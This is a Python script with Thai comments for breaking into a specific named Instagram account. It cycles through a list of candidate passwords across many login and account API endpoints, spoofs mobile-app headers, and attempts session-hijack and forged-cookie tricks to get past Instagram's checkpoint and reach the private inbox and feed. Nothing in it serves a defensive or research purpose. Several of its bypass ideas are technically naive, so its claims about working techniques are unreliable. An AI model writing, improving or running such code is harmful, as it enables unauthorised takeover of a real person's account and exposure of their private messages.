#!/usr/bin/env python3
"""
Instagram Response Pattern Analysis & New Bypass Strategy
การวิเคราะห์รูปแบบการตอบสนองใหม่ของ Instagram และกลยุทธ์ bypass

DISCOVERY: Instagram เปลี่ยนระบบการตอบสนอง
- เดิม: checkpoint_required + checkpoint_url
- ใหม่: {'user': True, 'authenticated': False, 'status': 'ok'}

กลยุทธ์ใหม่: Session Management และ API Endpoint Bypass
"""

import requests
import json
import time
import random
from datetime import datetime
import base64
import urllib.parse

class InstagramNewBypassStrategy:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.instagram.com"
        
        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
        self.valid_passwords = [
            "Fleming654", "Fleming786", "Fleming1004", 
            "Fleming1060", "Fleming1182", "Fleming1998"
        ]
        
        # API endpoints ต่างๆ ที่อาจใช้ bypass ได้
        self.api_endpoints = {
            'login_ajax': '/api/v1/web/accounts/login/ajax/',
            'login_mobile': '/api/v1/accounts/login/',
            'login_direct': '/accounts/login/ajax/',
            'session_create': '/api/v1/accounts/create_session/',
            'verify_email': '/api/v1/accounts/verify_email/',
            'reset_password': '/api/v1/accounts/reset_password/',
            'two_factor': '/api/v1/accounts/two_factor_authentication/',
            'session_info': '/api/v1/accounts/current_user/',
            'web_session': '/api/v1/web/sessions/login/'
        }
        
        # Mobile app headers
        self.mobile_headers = {
            'User-Agent': 'Instagram 123.0.0.21.114 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 185203708)',
            'X-IG-App-ID': '567067343352427',
            'X-IG-Android-ID': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTv10=',
            'Accept-Language': 'en-US',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'X-FB-HTTP-Engine': 'Liger'
        }
        
    def analyze_response_pattern(self, username, password):
        """วิเคราะห์รูปแบบการตอบสนองโดยละเอียด"""
        print(f"\n🔍 Analyzing response pattern for: {username}/{password}")
        
        # ทดสอบหลาย endpoints
        results = {}
        
        for endpoint_name, endpoint_path in self.api_endpoints.items():
            print(f"🎯 Testing endpoint: {endpoint_name}")
            
            try:
                result = self.test_endpoint(username, password, endpoint_path, endpoint_name)
                results[endpoint_name] = result
                
                # หน่วงเวลาระหว่าง endpoint
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"❌ Endpoint {endpoint_name} failed: {e}")
                results[endpoint_name] = {'error': str(e)}
        
        return results
    
    def test_endpoint(self, username, password, endpoint_path, endpoint_name):
        """ทดสอบ endpoint เฉพาะ"""
        url = self.base_url + endpoint_path
        
        # เตรียม headers ตาม endpoint
        if 'mobile' in endpoint_name:
            headers = self.mobile_headers.copy()
        else:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '*/*',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
        
        # เตรียม data ตาม endpoint
        if 'mobile' in endpoint_name:
            data = self.prepare_mobile_data(username, password)
        else:
            data = self.prepare_web_data(username, password)
        
        try:
            response = self.session.post(url, data=data, headers=headers, allow_redirects=False)
            
            result = {
                'url': url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': dict(response.cookies),
                'text_length': len(response.text),
                'text_sample': response.text[:200]
            }
            
            # Parse JSON if possible
            try:
                json_data = response.json()
                result['json'] = json_data
                print(f"📄 {endpoint_name}: {json_data}")
            except:
                result['json'] = None
            
            return result
            
        except Exception as e:
            return {'error': str(e)}
    
    def prepare_web_data(self, username, password):
        """เตรียมข้อมูลสำหรับ web login"""
        return {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
    
    def prepare_mobile_data(self, username, password):
        """เตรียมข้อมูลสำหรับ mobile login"""
        return {
            'username': username,
            'password': password,
            'device_id': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
            'login_attempt_count': '0'
        }
    
    def session_hijack_attempt(self, username, password):
        """พยายาม hijack session หลังจาก login ที่ถูกต้อง"""
        print(f"\n🎭 Attempting session hijack for: {username}/{password}")
        
        # ขั้นตอนที่ 1: Login เพื่อสร้าง partial session
        login_result = self.test_endpoint(username, password, '/api/v1/web/accounts/login/ajax/', 'web_login')
        
        if login_result.get('json', {}).get('user') == True:
            print("✅ User validation successful - attempting session extraction")
            
            # ขั้นตอนที่ 2: พยายามดึง session data
            session_cookies = self.session.cookies
            print(f"🍪 Available cookies: {list(session_cookies.keys())}")
            
            # ขั้นตอนที่ 3: ทดสอบ API endpoints ที่ต้องการ authentication
            protected_endpoints = [
                '/api/v1/accounts/current_user/',
                '/api/v1/feed/timeline/',
                '/api/v1/direct_v2/inbox/',
                '/api/v1/users/self/',
                '/' + username + '/?__a=1'
            ]
            
            for endpoint in protected_endpoints:
                try:
                    response = self.session.get(self.base_url + endpoint)
                    print(f"🔍 {endpoint}: Status {response.status_code}")
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if 'user' in data or 'feed' in data:
                                print(f"🎉 POSSIBLE SESSION HIJACK SUCCESS: {endpoint}")
                                return {'success': True, 'endpoint': endpoint, 'data': data}
                        except:
                            if len(response.text) > 1000:  # มีข้อมูลเยอะ = อาจจะ authenticated
                                print(f"🎉 POSSIBLE SESSION HIJACK SUCCESS: {endpoint}")
                                return {'success': True, 'endpoint': endpoint, 'text_length': len(response.text)}
                except Exception as e:
                    print(f"❌ {endpoint} failed: {e}")
        
        return {'success': False}
    
    def cookie_manipulation_bypass(self, username, password):
        """พยายาม bypass ด้วยการจัดการ cookies"""
        print(f"\n🍪 Attempting cookie manipulation bypass for: {username}/{password}")
        
        # ขั้นตอนที่ 1: เก็บ cookies หลังจาก login
        login_result = self.test_endpoint(username, password, '/api/v1/web/accounts/login/ajax/', 'web_login')
        
        if login_result.get('json', {}).get('user') == True:
            original_cookies = dict(self.session.cookies)
            print(f"🍪 Original cookies: {list(original_cookies.keys())}")
            
            # ขั้นตอนที่ 2: จัดการ cookies เพื่อหลอกให้คิดว่า authenticated
            manipulated_cookies = original_cookies.copy()
            
            # เพิ่ม/แก้ไข cookies ที่อาจจะทำให้ bypass ได้
            cookie_modifications = {
                'is_logged_in': '1',
                'logged_in_user': username,
                'authenticated': 'true',
                'ig_did': 'A1B2C3D4-E5F6-7890-ABCD-EF1234567890',
                'ig_nrcb': '1',
                'shbid': '"12345\\05412345:01f7abcdef1234567890abcdef123456789"',
                'shbts': '"1640995200\\05412345:01f7abcdef1234567890abcdef123456789"'
            }
            
            for key, value in cookie_modifications.items():
                self.session.cookies[key] = value
                print(f"🔧 Set cookie: {key} = {value}")
            
            # ขั้นตอนที่ 3: ทดสอบด้วย cookies ที่ถูกแก้ไข
            test_urls = [
                '/',
                '/accounts/edit/',
                f'/{username}/',
                '/direct/inbox/',
                '/api/v1/accounts/current_user/'
            ]
            
            for url in test_urls:
                try:
                    response = self.session.get(self.base_url + url)
                    print(f"🔍 {url}: Status {response.status_code}")
                    
                    if 'dashboard' in response.text or 'profile' in response.text:
                        print(f"🎉 COOKIE BYPASS SUCCESS: {url}")
                        return {'success': True, 'url': url}
                        
                except Exception as e:
                    print(f"❌ {url} failed: {e}")
        
        return {'success': False}
    
    def run_comprehensive_new_bypass(self):
        """รันการ bypass ด้วยกลยุทธ์ใหม่ทั้งหมด"""
        print("🚀 Starting New Instagram Bypass Strategy")
        print("🎯 Target: alx.trading")
        print("=" * 60)
        
        results = []
        
        for i, password in enumerate(self.valid_passwords, 1):
            print(f"\n📋 STRATEGY TEST {i}/{len(self.valid_passwords)}")
            print(f"Password: {password}")
            print("=" * 40)
            
            # กลยุทธ์ที่ 1: วิเคราะห์ response patterns
            print("🔍 Strategy 1: Response Pattern Analysis")
            response_analysis = self.analyze_response_pattern("alx.trading", password)
            
            # กลยุทธ์ที่ 2: Session hijack attempt
            print("🎭 Strategy 2: Session Hijack Attempt")
            session_hijack = self.session_hijack_attempt("alx.trading", password)
            
            # กลยุทธ์ที่ 3: Cookie manipulation
            print("🍪 Strategy 3: Cookie Manipulation")
            cookie_bypass = self.cookie_manipulation_bypass("alx.trading", password)
            
            result = {
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'response_analysis': response_analysis,
                'session_hijack': session_hijack,
                'cookie_bypass': cookie_bypass
            }
            
            results.append(result)
            
            # ตรวจสอบความสำเร็จ
            if session_hijack.get('success') or cookie_bypass.get('success'):
                print("🎉 BREAKTHROUGH ACHIEVED!")
                success_file = f"NEW_BYPASS_SUCCESS_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(success_file, 'w') as f:
                    json.dump(result, f, indent=2)
                print(f"💾 Success saved to: {success_file}")
            
            # หน่วงเวลาระหว่างการทดสอบ
            if i < len(self.valid_passwords):
                wait_time = random.uniform(10, 15)
                print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                time.sleep(wait_time)
        
        # บันทึกผลลัพธ์รวม
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"new_bypass_strategy_results_{timestamp}.json"
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 All results saved to: {results_file}")
        
        # สรุปผลลัพธ์
        success_count = sum(1 for r in results if 
                          r.get('session_hijack', {}).get('success') or 
                          r.get('cookie_bypass', {}).get('success'))
        
        print(f"\n📊 NEW STRATEGY SUMMARY")
        print("=" * 60)
        print(f"🎯 Total passwords tested: {len(results)}")
        print(f"✅ Successful bypasses: {success_count}")
        print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
        
        return results

if __name__ == "__main__":
    bypass_system = InstagramNewBypassStrategy()
    results = bypass_system.run_comprehensive_new_bypass()
